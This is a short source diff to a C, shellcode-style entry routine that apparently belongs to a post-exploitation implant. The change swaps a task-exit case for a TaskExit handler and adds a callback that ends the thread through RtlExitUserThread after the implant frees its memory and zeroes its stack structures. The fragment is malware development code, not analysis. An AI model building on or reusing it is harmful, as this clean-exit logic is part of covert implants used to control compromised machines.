@@ -39,6 +39,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 	API				Api;
 	MEMORY_BASIC_INFORMATION	Mbi;
 
+	PVOID				Ext = NULL;
 	DWORD				Res = 0;
 	PBUFFER				Inb = NULL;
 	PBUFFER				Onb = NULL;
@@ -122,14 +123,14 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 
 													/* Abort */
 													break;
-												case ExitFree:
+												case Exit:
 													/* Execute TaskExitFree */
-													Ctx->Established = FALSE;
+													Res = TaskExit( Ctx, Req->TaskId, Req->Buffer, Req->Length, Onb );
 													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
 													/* Set return info */
 													Ret->TaskId     = Req->TaskId;
-													Ret->ReturnCode = ExitFreeAction;
+													Ret->ReturnCode = Res;
 													Ret->ErrorValue = 0;
 
 													/* Abort */
@@ -174,6 +175,9 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 			};
 		};
 
+		/* Set exit callback! */
+		Ext = C_PTR( Ctx->Exit );
+
 		/* Cleanup */
 		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ctx );
 		Ctx = NULL;
@@ -182,4 +186,11 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
+
+	if ( Ext != NULL ) {
+		/* Execute the function with STATUS_SUCCESS */ ( ( __typeof__( RtlExitUserThread ) * ) Ext )( STATUS_SUCCESS );
+	};
+	
+	/* Abort! */
+	return;
 };
